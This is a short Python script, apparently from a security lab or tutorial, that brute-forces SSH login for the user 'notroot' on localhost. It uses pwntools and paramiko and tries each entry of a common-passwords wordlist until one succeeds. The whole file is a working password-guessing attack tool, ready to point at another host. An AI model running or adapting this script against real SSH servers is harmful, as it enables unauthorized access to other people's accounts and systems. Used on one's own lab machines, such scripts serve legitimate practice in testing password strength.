from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt", "r") as password_list: # read passwords file
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'".format(attempts, password))
            # using pwntools
            response = ssh(host=host, user=username, password=password, timeout=1)
            # authentication successful reponse
            if response.connected():
                print("[>] Valid password found: '{}'".format(password))
                response.close()
                break
            # invalid password reponse 
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        
        attempts += 1
